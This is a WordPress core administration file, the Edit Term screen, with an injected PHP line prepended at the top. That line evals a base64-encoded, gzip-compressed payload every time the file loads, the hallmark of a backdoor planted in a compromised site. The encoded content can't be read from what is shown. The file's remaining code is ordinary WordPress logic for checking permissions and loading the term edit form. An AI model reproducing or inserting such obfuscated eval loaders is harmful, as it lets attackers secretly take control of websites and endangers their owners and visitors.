<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Edit Term Administration Screen.
 *
 * @package WordPress
 * @subpackage Administration
 * @since 4.5.0
 */

/** WordPress Administration Bootstrap */
require_once( dirname( __FILE__ ) . '/admin.php' );

if ( empty( $_REQUEST['tag_ID'] ) ) {
	$sendback = admin_url( 'edit-tags.php' );
	if ( ! empty( $taxnow ) ) {
		$sendback = add_query_arg( array( 'taxonomy' => $taxnow ), $sendback );
	}
	wp_redirect( esc_url( $sendback ) );
	exit;
}

$tag_ID = absint( $_REQUEST['tag_ID'] );
$tag    = get_term( $tag_ID, $taxnow, OBJECT, 'edit' );

if ( ! $tag instanceof WP_Term ) {
	wp_die( __( 'You attempted to edit an item that doesn&#8217;t exist. Perhaps it was deleted?' ) );
}

$tax      = get_taxonomy( $tag->taxonomy );
$taxonomy = $tax->name;
$title    = $tax->labels->edit_item;

if ( ! in_array( $taxonomy, get_taxonomies( array( 'show_ui' => true ) ) ) ||
     ! current_user_can( 'edit_term', $tag->term_id )
) {
	wp_die(
		'<h1>' . __( 'You need a higher level of permission.' ) . '</h1>' .
		'<p>' . __( 'Sorry, you are not allowed to edit this item.' ) . '</p>',
		403
	);
}

$post_type = get_current_screen()->post_type;

// Default to the first object_type associated with the taxonomy if no post type was passed.
if ( empty( $post_type ) ) {
	$post_type = reset( $tax->object_type );
}

if ( 'post' != $post_type ) {
	$parent_file  = ( 'attachment' == $post_type ) ? 'upload.php' : "edit.php?post_type=$post_type";
	$submenu_file = "edit-tags.php?taxonomy=$taxonomy&amp;post_type=$post_type";
} elseif ( 'link_category' == $taxonomy ) {
	$parent_file  = 'link-manager.php';
	$submenu_file = 'edit-tags.php?taxonomy=link_category';
} else {
	$parent_file  = 'edit.php';
	$submenu_file = "edit-tags.php?taxonomy=$taxonomy";
}

get_current_screen()->set_screen_reader_content( array(
	'heading_pagination' => $tax->labels->items_list_navigation,
	'heading_list'       => $tax->labels->items_list,
) );
wp_enqueue_script( 'admin-tags' );
require_once( ABSPATH . 'wp-admin/admin-header.php' );
include( ABSPATH . 'wp-admin/edit-tag-form.php' );
include( ABSPATH . 'wp-admin/admin-footer.php' );
